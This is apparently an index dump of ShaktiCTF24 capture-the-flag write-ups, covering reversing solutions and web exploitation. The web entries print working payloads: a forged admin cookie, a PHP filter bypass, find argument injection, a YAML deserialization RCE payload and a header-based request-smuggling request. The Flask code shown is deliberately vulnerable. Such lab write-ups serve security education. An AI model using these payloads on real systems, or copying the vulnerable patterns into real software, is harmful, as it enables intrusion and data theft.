constraint solver called z3.","title":"Solution"},{"location":"ShaktiCTF24/reversing/NotBabyRev/#solution-script","text":"Here is the entire script - from z3 import * matr = [[Int(f'matr_{i}_{j}') for j in range(6)] for i in range(6)] sol = Solver() sol.add(matr[2][4] + matr[1][0] - matr[3][0] == 106) sol.add(matr[5][2] + matr[1][4] - matr[4][5] == 174) sol.add(matr[0][2] + matr[5][4] - matr[2][5] == 111) sol.add(matr[3][0] + matr[2][2] - matr[4][4] == 19) sol.add(matr[1][3] + matr[3][5] - matr[0][2] == 16) sol.add(matr[3][3] + matr[0][1] - matr[4][3] == 75) sol.add(matr[0][5] + matr[4][2] - matr[1][0] == 111) sol.add(matr[2][1] + matr[3][2] - matr[5][3] == 83) sol.add(matr[1][2] + matr[4][3] - matr[4][2] == 113) sol.add(matr[3][2] + matr[0][2] - matr[0][5] == 89) sol.add(matr[4][2] + matr[2][5] - matr[5][5] == 141) sol.add(matr[1][0] + matr[0][5] - matr[2][3] == 115) sol.add(matr[2][2] + matr[4][5] - matr[5][1] == 18) sol.add(matr[5][0] + matr[4][1] - matr[0][3] == 155) sol.add(matr[0][0] + matr[3][3] - matr[3][1] == 84) sol.add(matr[3][4] + matr[1][1] - matr[2][1] == 31) sol.add(matr[1][5] + matr[2][3] - matr[4][0] == 187) sol.add(matr[4][3] + matr[0][3] - matr[1][1] == 102) sol.add(matr[0][4] + matr[2][1] - matr[5][2] == 51) sol.add(matr[2][5] + matr[4][4] - matr[2][2] == 141) sol.add(matr[1][4] + matr[3][1] - matr[0][0] == 102) sol.add(matr[5][5] + matr[3][4] - matr[3][2] == 40) sol.add(matr[0][1] + matr[4][0] - matr[2][0] == 22) sol.add(matr[4][4] + matr[1][5] - matr[1][2] == 109) sol.add(matr[3][5] + matr[3][0] - matr[4][1] == 95) sol.add(matr[1][1] + matr[0][0] + matr[5][4] == 184) sol.add(matr[4][1] + matr[2][0] - matr[0][1] == 60) sol.add(matr[3][1] + matr[1][2] - matr[3][3] == 96) sol.add(matr[5][3] + matr[5][0] - matr[1][4] == 73) sol.add(matr[0][3] + matr[5][5] + matr[5][0] == 135) sol.add(matr[4][5] + matr[2][4] - matr[1][3] == 130) sol.add(matr[2][3] + matr[1][3] + matr[3][4] == 179) sol.add(matr[5][4] + matr[5][1] - matr[0][4] == 87) sol.add(matr[2][0] + matr[0][4] - matr[2][4] == 83) sol.add(matr[5][1] + matr[5][3] - matr[3][5] == 64) sol.add(matr[0][0] + matr[0][1] + matr[0][2] + matr[0][3] + matr[0][4] + matr[0][5] == 458) sol.add(matr[1][0] + matr[1][1] + matr[1][2] + matr[1][3] + matr[1][4] + matr[1][5] == 425) sol.add(matr[2][0] + matr[2][1] + matr[2][2] + matr[2][3] + matr[2][4] + matr[2][5] == 445) sol.add(matr[3][0] + matr[3][1] + matr[3][2] + matr[3][3] + matr[3][4] + matr[3][5] == 526) sol.add(matr[4][0] + matr[4][1] + matr[4][2] + matr[4][3] + matr[4][4] + matr[4][5] == 418) sol.add(matr[5][0] + matr[5][1] + matr[5][2] + matr[5][3] + matr[5][4] + matr[5][5] == 522) sol.add(matr[0][0] + matr[1][0] + matr[2][0] + matr[3][0] + matr[4][0] + matr[5][0] == 394) sol.add(matr[0][1] + matr[1][1] + matr[2][1] + matr[3][1] + matr[4][1] + matr[5][1] == 382) sol.add(matr[0][2] + matr[1][2] + matr[2][2] + matr[3][2] + matr[4][2] + matr[5][2] == 560) sol.add(matr[0][3] + matr[1][3] + matr[2][3] + matr[3][3] + matr[4][3] + matr[5][3] == 357) sol.add(matr[0][4] + matr[1][4] + matr[2][4] + matr[3][4] + matr[4][4] + matr[5][4] == 599) sol.add(matr[0][5] + matr[1][5] + matr[2][5] + matr[3][5] + matr[4][5] + matr[5][5] == 502) if sol.check() == sat: model = sol.model() result_matrix = [[model.evaluate(matr[i][j]) for j in range(6)] for i in range(6)] print(\"Satisfiable solution found:\") else: print(\"No satisfiable solution found.\") matrix = [[0 for j in range(6)] for i in range(6)] for i in range(6): for j in range(6): matrix[i][j] = result_matrix[i][j].as_long() for row in matrix: print(row) for i in range(6): matrix[i][2],matrix[i][3] = matrix[i][3],matrix[i][2] for j in range(6): matrix[1][j],matrix[5][j] = matrix[5][j],matrix[1][j] for k in range(6): matrix[k][1],matrix[k][4] = matrix[k][4],matrix[k][1] for a in range(6): matrix[0][a],matrix[3][a] = matrix[3][a],matrix[0][a] for b in range(36): matrix[b//6][b%6] += 5 for x in range(36): if x % 2 == 0: print(chr(matrix[x//6][x%6] ^ 0x38),end='') else: print(chr(matrix[x//6][x%6]),end='')","title":"Solution Script"},{"location":"ShaktiCTF24/reversing/NotBabyRev/#flag","text":"shaktictf{h0w_w4s_th3_fl4g_ch3ck3r?}","title":"Flag"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/","text":"Operation Ultra Description In \"Operation Ultra,\" Agent Evelyn \"Eclipse\" is on a mission to recover the vanished scientist, Dr. Viktor Kozlov, and secure his groundbreaking energy technology research. Author: k1n0r4 Difficulty level: Easy Points: 200 Category: Reverse Engineering Solution Decoding the base64-encoded string, unk_str we retrieve the key Shadows2024 . The func_1 is called with arguments unk_str and the input flag ( unk_str0 ). Within this function, a XOR operation is performed on each character from unk_str0 with a repeated sequence of unk_str . The output of func_1 ( unk_str1 ) is passed to func_2 , where an empty list ( unk_str3 ) is initialized. In two loops, characters from unk_str1 are selected at specific indices in unk_str3 , constructing a new string ( unk_str2 ) which is then returned. The operation performed is shuffling where elements from alternative positions are picked up and appended to a list. This final string ( unk_str2 ) is compared with a predefined set of ASCII values ( unk_arr0 ). If the comparison is successful, the input is considered correct. Solution script When reversing func_2 by inputting the given ASCII values and performing the same operations, we obtain the input to func_2 . Upon XORing this input with Shadows2024, the flag is obtained. def func_2(): unk_str3 = [32, 0, 27, 30, 84, 79, 86, 22, 97, 100, 63, 95, 60, 34, 1, 71, 0, 15, 81, 68, 6, 4, 91, 40, 87, 0, 9, 59, 81, 83, 102, 21] flag_len = len(unk_str3) unk_str0 = ['']*flag_len j = 0 for i in range(0, flag_len , 4): unk_str0[i] = unk_str3[j] unk_str0[i + 1] = unk_str3[j + 1] j += 2 for i in range(2, flag_len, 4): unk_str0[i] = unk_str3[j] unk_str0[i + 1] = unk_str3[j + 1] j += 2 return unk_str0 unk_str1=func_2() print(unk_str1) Output: [32, 0, 0, 15, 27, 30, 81, 68, 84, 79, 6, 4, 86, 22, 91, 40, 97, 100, 87, 0, 63, 95, 9, 59, 60, 34, 81, 83, 1, 71, 102, 21] li=[32, 0, 0, 15, 27, 30, 81, 68, 84, 79, 6, 4, 86, 22, 91, 40, 97, 100, 87, 0, 63, 95, 9, 59, 60, 34, 81, 83, 1, 71, 102, 21] a=\"Shadow2024Shadow2024Shadow2024Shadow2024\" for i,j in zip(li,a): print(' '.join(chr(i^ord(j))),end=\"\") Flag shaktictf{Ul7r4_STe4l7h_SUcc3s5}","title":"Operation Ultra"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/#operation-ultra","text":"","title":"Operation Ultra"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/#description","text":"In \"Operation Ultra,\" Agent Evelyn \"Eclipse\" is on a mission to recover the vanished scientist, Dr. Viktor Kozlov, and secure his groundbreaking energy technology research. Author: k1n0r4 Difficulty level: Easy Points: 200 Category: Reverse Engineering","title":"Description"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/#solution","text":"Decoding the base64-encoded string, unk_str we retrieve the key Shadows2024 . The func_1 is called with arguments unk_str and the input flag ( unk_str0 ). Within this function, a XOR operation is performed on each character from unk_str0 with a repeated sequence of unk_str . The output of func_1 ( unk_str1 ) is passed to func_2 , where an empty list ( unk_str3 ) is initialized. In two loops, characters from unk_str1 are selected at specific indices in unk_str3 , constructing a new string ( unk_str2 ) which is then returned. The operation performed is shuffling where elements from alternative positions are picked up and appended to a list. This final string ( unk_str2 ) is compared with a predefined set of ASCII values ( unk_arr0 ). If the comparison is successful, the input is considered correct.","title":"Solution"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/#solution-script","text":"When reversing func_2 by inputting the given ASCII values and performing the same operations, we obtain the input to func_2 . Upon XORing this input with Shadows2024, the flag is obtained. def func_2(): unk_str3 = [32, 0, 27, 30, 84, 79, 86, 22, 97, 100, 63, 95, 60, 34, 1, 71, 0, 15, 81, 68, 6, 4, 91, 40, 87, 0, 9, 59, 81, 83, 102, 21] flag_len = len(unk_str3) unk_str0 = ['']*flag_len j = 0 for i in range(0, flag_len , 4): unk_str0[i] = unk_str3[j] unk_str0[i + 1] = unk_str3[j + 1] j += 2 for i in range(2, flag_len, 4): unk_str0[i] = unk_str3[j] unk_str0[i + 1] = unk_str3[j + 1] j += 2 return unk_str0 unk_str1=func_2() print(unk_str1) Output: [32, 0, 0, 15, 27, 30, 81, 68, 84, 79, 6, 4, 86, 22, 91, 40, 97, 100, 87, 0, 63, 95, 9, 59, 60, 34, 81, 83, 1, 71, 102, 21] li=[32, 0, 0, 15, 27, 30, 81, 68, 84, 79, 6, 4, 86, 22, 91, 40, 97, 100, 87, 0, 63, 95, 9, 59, 60, 34, 81, 83, 1, 71, 102, 21] a=\"Shadow2024Shadow2024Shadow2024Shadow2024\" for i,j in zip(li,a): print(' '.join(chr(i^ord(j))),end=\"\")","title":"Solution script"},{"location":"ShaktiCTF24/reversing/Operation_Ultra/#flag","text":"shaktictf{Ul7r4_STe4l7h_SUcc3s5}","title":"Flag"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/","text":"Twisted_Calc Description Scientists are trying to figure out how this calculator works. They are essentially trying to crack the algorithm. Can you help them with it? Author: k1n0r4 Difficulty level: Hard Points: 500 Category: Reverse Engineering Solution The given file is an ELF 64-Bit Executable. What all is happening with the input? The input is taken and xorred with a predefined array of length 50 byte by byte. This indicates that the flag length is 50. Later it goes through a check function which contains constraints for the manipulated input. Next, a digital signal (in form of 1's and 0's) is declared. The xorred input is used to determine what operations will be performed on the given signal via the applySignalProcessing function. For every 5th index of the input, the state of the signal is being checked under the second_check function. Towards the flag Analysing the applySignalProcessing function indicates the use of 10 operations, hence there are only 10 possible elements of v10 array. For each batch of 5 elements of v10 array, there are 3 checks given to us in check function and a final signal state check in second_check function. # Checks for the first batch of 5 elements if ( (a1[3] ^ a1[2] ^ a1[1] ^ *a1 ^ a1[4]) != 44 ) exit(0); if ( *a1 != 32 ) exit(0); if ( a1[4] != 47 ) exit(0); Utilising these constraints and the fact that there are only 10 possible values, we can brute and get the values. One simple way to confirm which is the correct value could be by xorring the obtained values with the predefined array in step 1 and see which of the string makes sense or is readable. #include <stdio.h> #include <string.h> #include <math.h> #include <stdlib.h> #include <time.h> int applySignalProcessing(int digitalSignal, int operation, int parameter) { switch (operation) { case 20: return digitalSignal; case 23: return digitalSignal * 8; case 26: return digitalSignal + (parameter*3); case 29: if(digitalSignal > 1000) return digitalSignal; else return digitalSignal * parameter * parameter; case 32: return digitalSignal ^ parameter; case 35: if(digitalSignal > 1000000) return digitalSignal / 1000; case 38: if(digitalSignal > parameter) return digitalSignal - parameter; else return digitalSignal; case 41: if(digitalSignal > 10000) return digitalSignal; else return digitalSignal * parameter; case 44: return digitalSignal * 2 ; case 47: return digitalSignal + parameter; default: return 0; } } int main() { int a1[50] = {0}; a1[0] = 0x20; a1[5] = 32; a1[10] = 23; a1[15] = 41; a1[20] = 35; a1[25] = 26; a1[30] = 26; a1[35] = 29; a1[40] = 26; a1[45] = 38; a1[4] = 0x2F; a1[9] = 26; a1[14] = 47; a1[19] = 47; a1[24] = 41; a1[29] = 29; a1[34] = 44; a1[39] = 29; a1[44] = 20; a1[49] = 26; int signal[50] = {1,0,1,1,1,0,0,1,0,1,0,1,0,1,0,1,0,1,1,1,0,0,0,0,1,1,0,0,1,0,1,1,0,1,1,0}; int oper[10] = {20, 23, 26, 29, 32, 35, 38, 41, 44, 47}; int check[10] = {44, 31, 29, 20, 29, 42, 31, 47, 43, 42}; int final[50] = {44, 40, 44, 44, 44, 40, 40, 44, 40, 44, 40, 44, 40, 44, 40, 44, 40, 44, 44, 44, 40, 40, 40, 40, 44, 44, 40, 40, 44, 40, 44, 44, 40, 44, 44, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40}; for(int a = 0; a<10; a++) { for(int b = 0; b<10; b++) { for(int c = 0;c<10;c++) { int signal[50] = {1,0,1,1,1,0,0,1,0,1,0,1,0,1,0,1,0,1,1,1,0,0,0,0,1,1,0,0,1,0,1,1,0,1,1,0}; if((a1[0]^oper[a]^oper[b]^oper[c]^a1[4]) == 44) { int ope[5] = {a1[0], oper[a], oper[b], oper[c], a1[4]}; int res[3] = {oper[a], oper[b], oper[c]}; for( int i = 0;i<5;i++) { for(int j=0;j<50;j++){ signal[j] = applySignalProcessing(signal[j], ope[i], 10); } } int c = 1; for(int k =0;k<50;k++){ if(final[k] != signal[k]){ c = 0; } } if(c==1){ printf(\"\\nSolution found: %d %d %d\\n\\n\", res[0], res[1], res[2]); break; } } } } } } Output: Solution found: 44 44 35 The given solution, on xorring back gives the result as shakt , which is the starting 5 bytes of the flag format. Similarly, all the 10 batches of elements can be retrieved and formed into the flag. Flag shaktictf{3l3ctr0n1cs_s0m3t1m3s_1s_p41n_735294758}","title":"Twisted_Calc"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#twisted_calc","text":"","title":"Twisted_Calc"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#description","text":"Scientists are trying to figure out how this calculator works. They are essentially trying to crack the algorithm. Can you help them with it? Author: k1n0r4 Difficulty level: Hard Points: 500 Category: Reverse Engineering","title":"Description"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#solution","text":"The given file is an ELF 64-Bit Executable.","title":"Solution"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#what-all-is-happening-with-the-input","text":"The input is taken and xorred with a predefined array of length 50 byte by byte. This indicates that the flag length is 50. Later it goes through a check function which contains constraints for the manipulated input. Next, a digital signal (in form of 1's and 0's) is declared. The xorred input is used to determine what operations will be performed on the given signal via the applySignalProcessing function. For every 5th index of the input, the state of the signal is being checked under the second_check function.","title":"What all is happening with the input?"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#towards-the-flag","text":"Analysing the applySignalProcessing function indicates the use of 10 operations, hence there are only 10 possible elements of v10 array. For each batch of 5 elements of v10 array, there are 3 checks given to us in check function and a final signal state check in second_check function. # Checks for the first batch of 5 elements if ( (a1[3] ^ a1[2] ^ a1[1] ^ *a1 ^ a1[4]) != 44 ) exit(0); if ( *a1 != 32 ) exit(0); if ( a1[4] != 47 ) exit(0); Utilising these constraints and the fact that there are only 10 possible values, we can brute and get the values. One simple way to confirm which is the correct value could be by xorring the obtained values with the predefined array in step 1 and see which of the string makes sense or is readable. #include <stdio.h> #include <string.h> #include <math.h> #include <stdlib.h> #include <time.h> int applySignalProcessing(int digitalSignal, int operation, int parameter) { switch (operation) { case 20: return digitalSignal; case 23: return digitalSignal * 8; case 26: return digitalSignal + (parameter*3); case 29: if(digitalSignal > 1000) return digitalSignal; else return digitalSignal * parameter * parameter; case 32: return digitalSignal ^ parameter; case 35: if(digitalSignal > 1000000) return digitalSignal / 1000; case 38: if(digitalSignal > parameter) return digitalSignal - parameter; else return digitalSignal; case 41: if(digitalSignal > 10000) return digitalSignal; else return digitalSignal * parameter; case 44: return digitalSignal * 2 ; case 47: return digitalSignal + parameter; default: return 0; } } int main() { int a1[50] = {0}; a1[0] = 0x20; a1[5] = 32; a1[10] = 23; a1[15] = 41; a1[20] = 35; a1[25] = 26; a1[30] = 26; a1[35] = 29; a1[40] = 26; a1[45] = 38; a1[4] = 0x2F; a1[9] = 26; a1[14] = 47; a1[19] = 47; a1[24] = 41; a1[29] = 29; a1[34] = 44; a1[39] = 29; a1[44] = 20; a1[49] = 26; int signal[50] = {1,0,1,1,1,0,0,1,0,1,0,1,0,1,0,1,0,1,1,1,0,0,0,0,1,1,0,0,1,0,1,1,0,1,1,0}; int oper[10] = {20, 23, 26, 29, 32, 35, 38, 41, 44, 47}; int check[10] = {44, 31, 29, 20, 29, 42, 31, 47, 43, 42}; int final[50] = {44, 40, 44, 44, 44, 40, 40, 44, 40, 44, 40, 44, 40, 44, 40, 44, 40, 44, 44, 44, 40, 40, 40, 40, 44, 44, 40, 40, 44, 40, 44, 44, 40, 44, 44, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40}; for(int a = 0; a<10; a++) { for(int b = 0; b<10; b++) { for(int c = 0;c<10;c++) { int signal[50] = {1,0,1,1,1,0,0,1,0,1,0,1,0,1,0,1,0,1,1,1,0,0,0,0,1,1,0,0,1,0,1,1,0,1,1,0}; if((a1[0]^oper[a]^oper[b]^oper[c]^a1[4]) == 44) { int ope[5] = {a1[0], oper[a], oper[b], oper[c], a1[4]}; int res[3] = {oper[a], oper[b], oper[c]}; for( int i = 0;i<5;i++) { for(int j=0;j<50;j++){ signal[j] = applySignalProcessing(signal[j], ope[i], 10); } } int c = 1; for(int k =0;k<50;k++){ if(final[k] != signal[k]){ c = 0; } } if(c==1){ printf(\"\\nSolution found: %d %d %d\\n\\n\", res[0], res[1], res[2]); break; } } } } } } Output: Solution found: 44 44 35 The given solution, on xorring back gives the result as shakt , which is the starting 5 bytes of the flag format. Similarly, all the 10 batches of elements can be retrieved and formed into the flag.","title":"Towards the flag"},{"location":"ShaktiCTF24/reversing/Twisted_Calc/#flag","text":"shaktictf{3l3ctr0n1cs_s0m3t1m3s_1s_p41n_735294758}","title":"Flag"},{"location":"ShaktiCTF24/reversing/Warmup_rev/","text":"Warmup Rev Description Look Carefully! What you want lies inside straight in front of your eyes! Author: k1n0r4 Difficulty level: Beginner Points: 100 Category: Reverse Engineering Solution The given file is an ELF 64 bit binary. Let's use a decompiler to decompile the binary. The logic under main function indicates that binary inputs the flag, reverses it and compares against a hardcoded string. On reversing the given string, we retrive the flag. print(\"}!d33dn1_3gn3ll4hc_pUmr4w_4_51_s1ht{ftcitkahs\"[::-1]) Flag shaktictf{th1s_15_4_w4rmUp_ch4ll3ng3_1nd33d!}","title":"Warmup Rev"},{"location":"ShaktiCTF24/reversing/Warmup_rev/#warmup-rev","text":"","title":"Warmup Rev"},{"location":"ShaktiCTF24/reversing/Warmup_rev/#description","text":"Look Carefully! What you want lies inside straight in front of your eyes! Author: k1n0r4 Difficulty level: Beginner Points: 100 Category: Reverse Engineering","title":"Description"},{"location":"ShaktiCTF24/reversing/Warmup_rev/#solution","text":"The given file is an ELF 64 bit binary. Let's use a decompiler to decompile the binary. The logic under main function indicates that binary inputs the flag, reverses it and compares against a hardcoded string. On reversing the given string, we retrive the flag. print(\"}!d33dn1_3gn3ll4hc_pUmr4w_4_51_s1ht{ftcitkahs\"[::-1])","title":"Solution"},{"location":"ShaktiCTF24/reversing/Warmup_rev/#flag","text":"shaktictf{th1s_15_4_w4rmUp_ch4ll3ng3_1nd33d!}","title":"Flag"},{"location":"ShaktiCTF24/web/","text":"Web Exploitation Challenge Name Level Author Delicious Beginner Av4nth1ka Find the Flag Easy Av4nth1ka Filters Medium Av4nth1ka Ultimate Spiderman Fan Easy L0xm1 Notes V1 Hard L0xm1","title":"Web Exploitation"},{"location":"ShaktiCTF24/web/#web-exploitation","text":"Challenge Name Level Author Delicious Beginner Av4nth1ka Find the Flag Easy Av4nth1ka Filters Medium Av4nth1ka Ultimate Spiderman Fan Easy L0xm1 Notes V1 Hard L0xm1","title":"Web Exploitation"},{"location":"ShaktiCTF24/web/delicious/","text":"Delicious Description : How delicious! Author: Av4nth1ka Solution : This was the most easiest challenge in the CTF. Intercept a request and take a look at the cookie. Base64 decode the cookie and we will get {\"admin\":0}. We can change the admin's value to 1 to make the user admin. We can base64 encode this new JSON and send that as the cookie to get the flag. Final Payload - eyJhZG1pbiI6MX0= ( Base64 decoded - {\"admin\":1} ). Flag: shaktictf{heyo_beginnerr_you_got_the_flag}","title":"Delicious"},{"location":"ShaktiCTF24/web/delicious/#delicious","text":"Description : How delicious! Author: Av4nth1ka Solution : This was the most easiest challenge in the CTF. Intercept a request and take a look at the cookie. Base64 decode the cookie and we will get {\"admin\":0}. We can change the admin's value to 1 to make the user admin. We can base64 encode this new JSON and send that as the cookie to get the flag. Final Payload - eyJhZG1pbiI6MX0= ( Base64 decoded - {\"admin\":1} ). Flag: shaktictf{heyo_beginnerr_you_got_the_flag}","title":"Delicious"},{"location":"ShaktiCTF24/web/filters/","text":"Filters Description : No bypass! Author: Av4nth1ka Solution : In this challenge, we have a few restricted characters: single quotes ('), double quotes (\"), backticks (), dots (.), dollar signs ($), or forward slashes (/) and restricted functions require, include. Payload: http://localhost:8080/?command=highlight_file(glob(%22fl*txt%22)[0]); The payload uses the highlight_file()function in combination with theglob()function to find the file with a name starting with \"fl\" and ending with \"txt\". Theglob()function returns an array of matching file paths. By using glob(\"fl*txt\")[0] , we get the first matching file path, which is then passed to the highlight_file()` function. Flag: shaktictf{y0u_byp4553d_7h3_f1l73r5_y4y}","title":"Filters"},{"location":"ShaktiCTF24/web/filters/#filters","text":"Description : No bypass! Author: Av4nth1ka Solution : In this challenge, we have a few restricted characters: single quotes ('), double quotes (\"), backticks (), dots (.), dollar signs ($), or forward slashes (/) and restricted functions require, include. Payload: http://localhost:8080/?command=highlight_file(glob(%22fl*txt%22)[0]); The payload uses the highlight_file()function in combination with theglob()function to find the file with a name starting with \"fl\" and ending with \"txt\". Theglob()function returns an array of matching file paths. By using glob(\"fl*txt\")[0] , we get the first matching file path, which is then passed to the highlight_file()` function. Flag: shaktictf{y0u_byp4553d_7h3_f1l73r5_y4y}","title":"Filters"},{"location":"ShaktiCTF24/web/find_the_flag/","text":"Find the flag Description : Flag is in flag.txt Author: Av4nth1ka Solution : This challenge is basically Arguement injection using find command. We are given with the main.py: import os from flask import Flask, request, render_template app = Flask(__name__) @app.get('/') def index(): test = request.args.get('test', None) if test is None: return render_template('index.html') command = f\"find {test}\" try: output = os.popen(command).read() except Exception as e: output = f\"Error: {str(e)}\" return render_template('index.html', output=output) if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) Intended payload for flag: flag.txt -exec cat {} ; http://localhost:5000/?test=flag.txt%20-exec%20cat%20{}%20; Flag: shaktictf{finally_you found_the_flag_hehehheh!} %","title":"Find the flag"},{"location":"ShaktiCTF24/web/find_the_flag/#find-the-flag","text":"Description : Flag is in flag.txt Author: Av4nth1ka Solution : This challenge is basically Arguement injection using find command. We are given with the main.py: import os from flask import Flask, request, render_template app = Flask(__name__) @app.get('/') def index(): test = request.args.get('test', None) if test is None: return render_template('index.html') command = f\"find {test}\" try: output = os.popen(command).read() except Exception as e: output = f\"Error: {str(e)}\" return render_template('index.html', output=output) if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) Intended payload for flag: flag.txt -exec cat {} ; http://localhost:5000/?test=flag.txt%20-exec%20cat%20{}%20; Flag: shaktictf{finally_you found_the_flag_hehehheh!} %","title":"Find the flag"},{"location":"ShaktiCTF24/web/notes_v1/","text":"Notes V1 Description Is there more to the Simple Notes app than meets the eye? Author: L0xm1 Solution We are given with a notes-app where we can add notes and edit notes. Lets dive into the source code given. app.py from flask import Flask, request, render_template, redirect, url_for from werkzeug.serving import WSGIRequestHandler import os import yaml from yaml import * import uuid from threading import Thread app = Flask(__name__) notes = [] @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': title = request.form['title'] content = request.form['content'] note_id = str(uuid.uuid4()) notes.append({'id': note_id, 'title': title, 'content': content}) return redirect(url_for('index')) else: return render_template('index.html', notes=notes) @app.route('/add_note', methods=['POST']) def add_note(): title = request.form['title'] content = request.form['content'] note_id = str(uuid.uuid4()) notes.append({'id': note_id, 'title': title, 'content': content}) return render_template('index.html', notes=notes) @app.route('/edit_note/<note_id>', methods=['GET', 'POST']) def edit_note(note_id): note = next((note for note in notes if note['id'] == note_id), None) if note: if request.method == 'POST': title = request.form['title'] content = request.form['content'] note['title'] = title note['content'] = content return redirect(url_for('index')) else: return render_template('edit.html', note=note) else: return 'Note not found', 404 @app.route('/admin', methods=['GET']) def serialize(): data=request.args.get('data') if data: deserialized=yaml.load(data,Loader=Loader) return deserialized else: return \"No data provided\" if __name__ == '__main__': WSGIRequestHandler.protocol_version = \"HTTP/1.1\" app.run(host='0.0.0.0', port=5000, threaded=True, debug=False) In /admin endpoint, yaml.load() is used which is vulnerable to deserialization vulnerability and a user can get RCE. We can use the following payload to read the flag. !!python/object/apply:subprocess.check_output args: - - cat - flag.txt But if we look into the go-proxy code, the /admin endpoint is prohibitted from accessing. main.go package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) type loggingResponseWriter struct { http.ResponseWriter } func (lrw *loggingResponseWriter) Write(b []byte) (int, error) { log.Printf(\"Response Body: %s\\n\", string(b)) return lrw.ResponseWriter.Write(b) } func loggingHandler(h http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { // log.Printf(\"Request Headers: %+v\\n\", r.Header) // Set Connection: keep-alive header in the outgoing request // r.Header.Set(\"Connection\", \"keep-alive\") lrw := &loggingResponseWriter{w} h.ServeHTTP(lrw, r) // log.Printf(\"Response Headers: %+v\\n\", lrw.Header()) }) } func main() { origin, err := url.Parse(\"http://localhost:5000\") if err != nil { panic(err) } proxy := httputil.NewSingleHostReverseProxy(origin) http.DefaultTransport.(*http.Transport).MaxIdleConns = 500 http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 100 http.Handle(\"/\", loggingHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { if r.URL.Path == \"/admin\" { http.Error(w, \"Access to /admin is prohibited\", http.StatusForbidden) return } proxy.ServeHTTP(w, r) }))) log.Println(\"Server started at :8000...\") log.Fatal(http.ListenAndServe(\":8000\", nil)) } We need to bypass the proxy to reach /admin endpoint and we can get RCE using yaml deserialization vulnerability. How will we bypass the proxy? In Werkzeug, underscores (_) are converted to hyphens (-) and interpreted as such. This means that the Content_Length header is treated in the same way as Content-Length. So we can give Content-Length and Content_Length, such that the go-proxy will consider only the first Content-Length header, and Werkzeug will consider the second Content_Length header. We can use this trick to smuggle our request to /admin endpoint, thus bypassing the proxy. Combining everything, we can smuggle our request to /admin endpoint using the following request and get the flag. POST / HTTP/1.1 Host: localhost:8000 Content-Length: 151 Content_Length: 0 GET /admin?data=%21%21python%2Fobject%2Fapply%3Asubprocess.check_output%0Aargs%3A%0A-%20-%20cat%0A%20%20-%20flag.txt HTTP/1.1 Host: localhost:8000 GET / HTTP/1.1 Host: localhost:8000 Flag: shaktictf{c0ngr4ts_y0u_bypassed_the_proxy}","title":"Notes V1"},{"location":"ShaktiCTF24/web/notes_v1/#notes-v1","text":"Description Is there more to the Simple Notes app than meets the eye? Author: L0xm1 Solution We are given with a notes-app where we can add notes and edit notes. Lets dive into the source code given. app.py from flask import Flask, request, render_template, redirect, url_for from werkzeug.serving import WSGIRequestHandler import os import yaml from yaml import * import uuid from threading import Thread app = Flask(__name__) notes = [] @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': title = request.form['title'] content = request.form['content'] note_id = str(uuid.uuid4()) notes.append({'id': note_id, 'title': title, 'content': content}) return redirect(url_for('index')) else: return render_template('index.html', notes=notes) @app.route('/add_note', methods=['POST']) def add_note(): title = request.form['title'] content = request.form['content'] note_id = str(uuid.uuid4()) notes.append({'id': note_id, 'title': title, 'content': content}) return render_template('index.html', notes=notes) @app.route('/edit_note/<note_id>', methods=['GET', 'POST']) def edit_note(note_id): note = next((note for note in notes if note['id'] == note_id), None) if note: if request.method == 'POST': title = request.form['title'] content = request.form['content'] note['title'] = title note['content'] = content return redirect(url_for('index')) else: return render_template('edit.html', note=note) else: return 'Note not found', 404 @app.route('/admin', methods=['GET']) def serialize(): data=request.args.get('data') if data: deserialized=yaml.load(data,Loader=Loader) return deserialized else: return \"No data provided\" if __name__ == '__main__': WSGIRequestHandler.protocol_version = \"HTTP/1.1\" app.run(host='0.0.0.0', port=5000, threaded=True, debug=False) In /admin endpoint, yaml.load() is used which is vulnerable to deserialization vulnerability and a user can get RCE. We can use the following payload to read the flag. !!python/object/apply:subprocess.check_output args: - - cat - flag.txt But if we look into the go-proxy code, the /admin endpoint is prohibitted from accessing. main.go package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) type loggingResponseWriter struct { http.ResponseWriter } func (lrw *loggingResponseWriter) Write(b []byte) (int, error) { log.Printf(\"Response Body: %s\\n\", string(b)) return lrw.ResponseWriter.Write(b) } func loggingHandler(h http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { // log.Printf(\"Request Headers: %+v\\n\", r.Header) // Set Connection: keep-alive header in the outgoing request // r.Header.Set(\"Connection\", \"keep-alive\") lrw := &loggingResponseWriter{w} h.ServeHTTP(lrw, r) // log.Printf(\"Response Headers: %+v\\n\", lrw.Header()) }) } func main() { origin, err := url.Parse(\"http://localhost:5000\") if err != nil { panic(err) } proxy := httputil.NewSingleHostReverseProxy(origin) http.DefaultTransport.(*http.Transport).MaxIdleConns = 500 http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 100 http.Handle(\"/\", loggingHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { if r.URL.Path == \"/admin\" { http.Error(w, \"Access to /admin is prohibited\", http.StatusForbidden) return } proxy.ServeHTTP(w, r) }))) log.Println(\"Server started at :8000...\") log.Fatal(http.ListenAndServe(\":8000\", nil)) } We need to bypass the proxy to reach /admin endpoint and we can get RCE using yaml deserialization vulnerability. How will we bypass the proxy? In Werkzeug, underscores (_) are converted to hyphens (-) and interpreted as such. This means that the Content_Length header is treated in the same way 